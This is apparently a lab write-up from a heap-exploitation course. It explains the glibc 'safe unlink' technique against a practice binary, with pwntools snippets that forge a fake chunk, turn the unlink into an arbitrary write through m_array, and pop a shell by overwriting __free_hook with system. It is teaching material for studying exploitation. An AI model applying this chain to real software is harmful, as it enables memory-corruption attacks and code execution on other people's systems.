# Safe Unlink

## Checksec

![checksec.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/checksec.png)

## Tips
1. Avoid use 'vis' command when corrupted the heap

2. Some commands
```
pwndbg> p *((struct malloc_chunk*)0x603010).fd
pwndbg> dq mp_-sbrK_base
pwndbg> p__free_hook
pwndbg> ds m_array[0].user_data
```

## Reflected write

### 1. Prepare chunks


![Image1.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image1.png)

### 2. Bypass protections

#### corrupted size vs. prev_size

```
fd = 0xdeadbeef
bk = 0xcafebabe
prev_size = 0x90
fake_size = 0x90
edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
```

The prev_size field must correspond to the size field of the previous chunk.


#### corrupted double-linked list


![Image2.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image2.png)


The problem is shown in the code section, and we can see that libc detects our unlinking because the backward pointer of next chunk must point to the original previous chunk of this, and forward pointer of previous chunk also must point to the original next chunk of this. As the error shows, it says that the doubly linked list was corrupted.

We could pass the safe unlinking check by simply setting both our forged fd and bk to the address of the chunk being unlinking. Malloc doesn't keep track of allocated chunks, it keeps pointers to its heaps' top chunk and free chunk in their respective arenas, but when a chunk is allocated to a thread, that thread is expected to keep a reference of the chunk, the program must strore pointers to every chubk it's been allocated somewhere, whether it keeps them on the stack, in data section or even on the heap itself.

This binary keeps pointers in their data section in an array labeled m_array...

![Image3.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image3.png)


```
fd = elf.sym.m_array-24
bk = elf.sym.m_array-16
prev_size = 0x90
fake_size = 0x90
edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
```

![Image4.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image4.png)

But error persists, so maybe need to make that chunk needs to unlink from the start of user data's of chunk, we need to add some metadata since we are now forging an entire fake chunk inside it.

Lastly, we need to decrease the amount of garbage out bk and prev size field to account for the new fields.

```
fd = elf.sym.m_array-24
bk = elf.sym.m_array-16
prev_size = 0x80
fake_size = 0x90
edit(chunk_A, p64(0)+p64(80)+ p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))
free(chunk_B)
```

We had to create a new chunk because when it validates the size, the bytes we ask for having to add the 16 of the metadata and that is when it does not meet the prev size constraint. And we could not request the chunk of that size from the beginning, because I would not store them in the same list and they would not be contiguous.

![Image5.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image5.png)

This is enough to pass the safe unlinking check ...

![Image6.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image6.png)

We noticed that the area has also been overwritten

![Image7.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image7.png)

And arbitrary writing has worked, now m_array points to our fake chunk, and can write on itself. 

```
edit(0,p64(0)*3 +p64(elf.sym.target))
edit(0, 'Hello world')
```

![Image8.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/Image8.png)

![reflected_write.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/reflected_write.jpeg)

## Get Shell

```
edit(0,p64(0)*3 +p64(libc.sym.__free_hook - 8 ))
edit(0, b'/bin/sh\0'+ p64(libc.sym.system))
free(0)
```

![shell.png](https://raw.githubusercontent.com/ivanmedina/Pwning/master/HEAP/HeapLAB/safe_unlink/assets/shell.png)

## Summary

- Request two chunks A and B, and leveraged an overflow bug to clear prev_inuse flag on the allocated chunk B.
- Prepare a fake chunk metadata in its previous chunk, chunk A, including a size field, forward pointer and backward pointer, and prev_size field.
- When we freed chunk B, its clear prev_inuse flag indicated to malloc that the previous chunk was free, therefore a candidate for consolidation.
- Malloc used our forged prev_size field to find the start of the previous chunk so it could unlink prior to consolidation.
- FD and BK checked that the BK at the destination pointed back to our fake chunk, and perform the same check to BK.
- Once our fake chunk passed the safe unlinking checks, malloc unlinked it. 
- It followed our FD and copied our BK over the BK at its destination. Then it followed our BK and copied our FD over the FD at its destination.


## References

* Max Kamper, Linux Heap Exploitation - Part 1, Udemy 6(15)
* https://github.com/ivanmedina/Pwning/tree/master/HEAP/HeapLAB/unsafe_unlink